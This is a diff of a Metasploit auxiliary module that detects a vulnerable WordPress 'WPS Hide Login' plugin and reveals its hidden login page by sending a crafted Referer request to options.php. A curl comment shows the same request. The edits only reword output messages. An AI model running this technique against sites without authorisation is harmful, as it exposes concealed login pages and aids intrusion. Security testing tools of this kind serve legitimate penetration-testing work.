@@ -47,9 +47,9 @@ class MetasploitModule < Msf::Auxiliary
     unless [Msf::Exploit::CheckCode::Vulnerable, Msf::Exploit::CheckCode::Appears, Msf::Exploit::CheckCode::Detected].include?(checkcode)
       fail_with Failure::NotVulnerable, "#{ip} - A vulnerable version of the 'WPS Hide Login' was not found"
     end
-    print_good("#{ip} - Vulnerable version detected")
+    print_good("#{ip} - Vulnerable version of wps_hide_login detected")
 
-    print_status("#{ip} - Determining Login Page")
+    print_status("#{ip} - Determining login page")
     # curl --referer "something" -sIXGET http://<ip>/wp-admin/options.php
     res = send_request_cgi({
       'method' => 'GET',
@@ -60,9 +60,9 @@ class MetasploitModule < Msf::Auxiliary
     })
 
     fail_with Failure::Unreachable, "#{ip} - Connection failed" unless res
-    fail_with Failure::NotVulnerable, "#{ip} - Connection failed. Non 302 code received" if res.code != 302
+    fail_with Failure::NotVulnerable, "#{ip} - Connection failed. Didn't receive a HTTP 302 redirect to the secret login page" if res.code != 302
     if res.headers['Location']
-      print_good("Login Page: #{res.headers['Location']}")
+      print_good("Login page: #{res.headers['Location']}")
     else
       print_error('No location header found')
     end
